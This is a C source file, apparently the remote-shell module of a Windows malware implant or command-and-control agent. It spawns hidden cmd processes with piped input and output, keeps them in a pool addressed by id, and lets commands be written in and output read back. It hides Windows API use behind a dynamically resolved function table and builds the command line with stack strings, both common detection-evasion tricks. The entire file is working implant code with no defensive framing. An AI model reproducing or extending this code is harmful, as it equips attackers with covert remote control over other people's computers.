#include "types.h"
#include "shell.h"
#include "kernel32.h"
#include "memory.h"
#include "stackstrings.h"

int shell_spawn(shell_slot *slot)
{
    SECURITY_ATTRIBUTES inheritable;
    inheritable.nLength = sizeof(SECURITY_ATTRIBUTES);
    inheritable.lpSecurityDescriptor = NULL;
    inheritable.bInheritHandle = TRUE;
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel))
        return 1;

    HANDLE stdin_r  = NULL, stdin_w  = NULL;
    HANDLE stdout_r = NULL, stdout_w = NULL;

    if (!kernel.CreatePipe(&stdin_r,  &stdin_w,  &inheritable, 0)) return 1;
    if (!kernel.CreatePipe(&stdout_r, &stdout_w, &inheritable, 0)) {
        kernel.CloseHandle(stdin_r); kernel.CloseHandle(stdin_w);
        return 1;
    }

    kernel.SetHandleInformation(stdin_w,  HANDLE_FLAG_INHERIT, 0);
    kernel.SetHandleInformation(stdout_r, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si;
    MemoryZero(&si, sizeof(si));
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = stdin_r;
    si.hStdOutput = stdout_w;
    si.hStdError  = stdout_w;

    PROCESS_INFORMATION pi;
    MemoryZero(&pi, sizeof(pi));

    WCHAR cmdline[27];
    StrCmdline(cmdline);
    BOOL ok = kernel.CreateProcessW(NULL, cmdline,
                             NULL, NULL, TRUE, CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);

    kernel.CloseHandle(stdin_r);
    kernel.CloseHandle(stdout_w);

    if (!ok) {
        kernel.CloseHandle(stdin_w);
        kernel.CloseHandle(stdout_r);
        return 1;
    }

    kernel.CloseHandle(pi.hThread);
    slot->in_use  = 1;
    slot->stdin_w = stdin_w;
    slot->stdout_r = stdout_r;
    slot->process = pi.hProcess;
    return 0;
}

int shell_open(shell_slot pool[])
{
    for (int i = 0; i < SHELL_POOL_SIZE; i++) {
        if (!pool[i].in_use) {
            if (shell_spawn(&pool[i]) == 0)
                return i;
            return -1;
        }
    }
    return -1;
}

void shell_teardown(shell_slot *slot)
{
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel))
        return;

    if (!slot->in_use)
        return;
    if (slot->process) {
        kernel.TerminateProcess(slot->process, 0);
        kernel.CloseHandle(slot->process);
    }
    if (slot->stdin_w)   kernel.CloseHandle(slot->stdin_w);
    if (slot->stdout_r)  kernel.CloseHandle(slot->stdout_r);
    MemoryZero(slot, sizeof(*slot));
}

shell_slot *shell_lookup(shell_slot pool[], unsigned long long id)
{
    if (id >= SHELL_POOL_SIZE || !pool[id].in_use)
        return NULL;
    return &pool[id];
}

int shell_write(shell_slot *slot, const void *data, DWORD len)
{
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel))
        return 1;

    DWORD written = 0;
    if (!kernel.WriteFile(slot->stdin_w, data, len, &written, NULL) ||
        written != len) {
        shell_teardown(slot);
        return 1;
    }
    return 0;
}

int shell_read(shell_slot *slot, unsigned char *out, DWORD cap, DWORD *out_len)
{
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel))
        return SHELL_READ_DEAD;

    DWORD available = 0;
    if (!kernel.PeekNamedPipe((HANDLE)slot->stdout_r, NULL, 0, NULL, &available, NULL)) {

        shell_teardown(slot);
        return SHELL_READ_DEAD;
    }
    if (available == 0)
        return SHELL_READ_IDLE;

    if (cap > available)
        cap = available;
    DWORD got = 0;
    if (!kernel.ReadFile((HANDLE)slot->stdout_r, out, cap, &got, NULL) || got == 0) {
        shell_teardown(slot);
        return SHELL_READ_DEAD;
    }
    *out_len = got;
    return SHELL_READ_OK;
}

void shell_teardown_all(shell_slot pool[])
{
    for (int i = 0; i < SHELL_POOL_SIZE; i++)
        shell_teardown(&pool[i]);
}
